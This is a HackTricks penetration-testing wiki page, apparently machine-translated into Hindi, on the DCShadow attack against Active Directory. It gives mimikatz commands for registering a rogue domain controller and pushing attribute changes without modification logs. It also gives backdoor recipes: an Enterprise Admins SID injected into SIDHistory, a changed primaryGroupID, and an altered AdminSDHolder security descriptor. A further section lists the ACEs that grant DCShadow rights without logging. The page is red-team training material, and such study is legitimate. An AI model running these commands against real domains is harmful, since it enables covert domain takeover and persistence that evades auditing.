{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

यह AD में एक **नया डोमेन कंट्रोलर** पंजीकृत करता है और निर्दिष्ट वस्तुओं पर **गुण** (SIDHistory, SPNs...) को **धकेलने** के लिए इसका उपयोग करता है **बिना** किसी **लॉग** के जो **संशोधनों** के बारे में हो। आपको **DA** विशेषाधिकार की आवश्यकता है और **रूट डोमेन** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत डेटा का उपयोग करते हैं, तो बहुत ही खराब लॉग दिखाई देंगे।

हमला करने के लिए आपको 2 mimikatz उदाहरणों की आवश्यकता है। इनमें से एक RPC सर्वरों को SYSTEM विशेषाधिकार के साथ शुरू करेगा (आपको यहां उन परिवर्तनों को इंगित करना होगा जिन्हें आप करना चाहते हैं), और दूसरा उदाहरण मानों को धकेलने के लिए उपयोग किया जाएगा:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - DA या समान की आवश्यकता है" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

ध्यान दें कि **`elevate::token`** `mimikatz1` सत्र में काम नहीं करेगा क्योंकि यह थ्रेड के विशेषाधिकारों को बढ़ाता है, लेकिन हमें **प्रक्रिया के विशेषाधिकारों** को बढ़ाने की आवश्यकता है।\
आप "LDAP" ऑब्जेक्ट भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप DA से या इस न्यूनतम अनुमतियों वाले उपयोगकर्ता से परिवर्तन धकेल सकते हैं:

* **डोमेन ऑब्जेक्ट** में:
* _DS-Install-Replica_ (डोमेन में प्रतिकृति जोड़ें/हटाएं)
* _DS-Replication-Manage-Topology_ (प्रतिलिपि टोपोलॉजी प्रबंधित करें)
* _DS-Replication-Synchronize_ (प्रतिलिपि समन्वय)
* **कॉन्फ़िगरेशन कंटेनर** में **साइट्स ऑब्जेक्ट** (और इसके बच्चे):
* _CreateChild and DeleteChild_
* **DC** के रूप में पंजीकृत **कंप्यूटर का ऑब्जेक्ट**:
* _WriteProperty_ (लिखें नहीं)
* **लक्ष्य ऑब्जेक्ट**:
* _WriteProperty_ (लिखें नहीं)

आप [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग करके इन विशेषाधिकारों को एक अप्रिविलेज्ड उपयोगकर्ता को दे सकते हैं (ध्यान दें कि इससे कुछ लॉग छोड़ेंगे)। यह DA विशेषाधिकारों की तुलना में बहुत अधिक प्रतिबंधात्मक है।\
उदाहरण: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  इसका मतलब है कि उपयोगकर्ता नाम _**student1**_ जब मशीन _**mcorp-student1**_ में लॉग इन होता है, तो उसके पास ऑब्जेक्ट _**root1user**_ पर DCShadow विशेषाधिकार हैं।

## DCShadow का उपयोग करके बैकडोर बनाना

{% code title="SIDHistory में एक उपयोगकर्ता के लिए एंटरप्राइज एडमिन्स सेट करें" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="प्राथमिक समूह आईडी बदलें (उपयोगकर्ता को डोमेन प्रशासकों के सदस्य के रूप में डालें)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="AdminSDHolder के ntSecurityDescriptor को संशोधित करें (एक उपयोगकर्ता को पूर्ण नियंत्रण दें)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow का उपयोग करके DCShadow अनुमतियाँ दें (संशोधित अनुमतियाँ लॉग नहीं)

हमें अपने उपयोगकर्ता के SID के साथ निम्नलिखित ACEs को अंत में जोड़ने की आवश्यकता है:

* डोमेन ऑब्जेक्ट पर:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* हमलावर कंप्यूटर ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* लक्षित उपयोगकर्ता ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
* कॉन्फ़िगरेशन कंटेनर में साइट्स ऑब्जेक्ट पर: `(A;CI;CCDC;;;UserSID)`

किसी ऑब्जेक्ट का वर्तमान ACE प्राप्त करने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

ध्यान दें कि इस मामले में आपको **कई परिवर्तन** करने की आवश्यकता है, केवल एक नहीं। इसलिए, **mimikatz1 सत्र** (RPC सर्वर) में उस परिवर्तन के साथ **`/stack`** पैरामीटर का उपयोग करें जिसे आप करना चाहते हैं। इस तरह, आपको सभी स्टक किए गए परिवर्तनों को करने के लिए केवल एक बार **`/push`** करने की आवश्यकता होगी।

[**DCShadow के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर हमें **फॉलो** करें [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **हैकिंग ट्रिक्स साझा करें और [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।**

</details>
{% endhint %}
